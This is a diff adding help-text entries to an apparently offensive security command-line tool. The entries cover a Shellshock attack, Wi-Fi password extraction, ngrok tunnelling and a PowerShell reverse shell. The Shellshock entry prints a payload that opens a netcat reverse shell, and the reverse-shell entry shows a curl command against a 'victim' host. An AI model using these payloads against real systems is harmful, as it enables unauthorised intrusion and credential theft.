@@ -4263,6 +4263,101 @@ line (str): The command line input for the cacti exploit function,
 Returns:
 None
 
+## smalldic
+Handles the creation of temporary files for users and passwords based on a small dictionary.
+
+This function prompts the user to decide whether to use a small dictionary for generating 
+user and password lists. If the user agrees, it loads the credentials from a JSON file and 
+writes them into temporary files. If the user declines, the process is aborted.
+
+Parameters:
+list (str): Not used in this function, but kept for compatibility with cmd command input.
+
+Returns:
+None
+
+## ngrok
+Set up and run ngrok on a specified local port. If ngrok is not installed, it will
+automatically be installed. The user will be prompted to provide their ngrok
+authentication token to complete the setup.
+
+Args:
+    line (str): The input line, though it's not directly used in this function.
+
+Workflow:
+1. Check if the local port specified in `self.params["lport"]` is valid.
+2. Verify if ngrok is installed. If not, proceed with installation.
+3. After installation, prompt the user to authenticate ngrok using their token.
+4. Once authenticated, run ngrok to expose the specified local port.
+
+Note:
+    The ngrok authentication token can be obtained from the ngrok dashboard.
+
+## wifipass
+This function generates a PowerShell script that retrieves saved Wi-Fi passwords on a Windows system.
+The script gathers the Wi-Fi profiles, extracts their passwords, and saves the information in a text file
+named 'wifi_passwords.txt' in the directory where the script is executed. The generated PowerShell command
+is copied to the clipboard for easy execution.
+
+Parameters:
+line (str): This parameter is not used within the function but is required for the command interface.
+
+The function does not return any value.
+
+## shellshock
+Executes a Shellshock attack against a target.
+
+This function constructs and sends a specially crafted HTTP request designed to exploit 
+the Shellshock vulnerability on a target server. The payload is embedded in the 
+'User-Agent' header, and when executed, it will open a reverse shell connection to 
+the attacker's machine.
+
+Parameters:
+- lport: Local port for the reverse shell connection, retrieved from self.params.
+- lhost: Local host for the reverse shell connection, retrieved from self.params.
+
+The function first validates the local host (lhost) and local port (lport) using 
+check_lhost() and check_lport(). If either validation fails, the function returns 
+without proceeding.
+
+If the validation passes, the payload is created using the format:
+'() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
+where rhost is the remote target's IP address and lport is the specified local port.
+
+The function then attempts to send a GET request to the target URL (args.target) 
+with the crafted payload in the 'User-Agent' header. The server's response is captured 
+and printed using print_msg().
+
+If any error occurs during the request, an error message is displayed using print_error().
+
+Returns:
+None
+
+## powerserver
+This function generates a PowerShell script that retrieves reverse shell over http on a Windows system.
+The script generated PowerShell reverse shell to execute command by curl command
+is copied to the clipboard for easy execution.
+
+Parameters:
+line (str): This parameter is used to get the port to create the listener
+
+The function does not return any value.
+Example of use: curl -X POST http://victim:8080/ -d "Get-Process"
+
+## morse
+*********************** Welcome to Morse Code Convertor 🔄️ ***********************
+
+                 1️⃣  to convert text to Morse code
+                 2️⃣  to convert Morse code to text
+                 0️⃣  to exit the program
+*********************** End Morse Code Convertor 🔄️ ***********************                     
+
+## waybackmachine
+Fetch URLs from the Wayback Machine for a given website.
+The URL is taken from line. If the URL is not provided, an error is printed.
+The limit of results is taken from self.params["limit"] if provided; otherwise, defaults to 10.
+Results are printed directly to the console.
+
 ## find_tgts
 No description available.
 
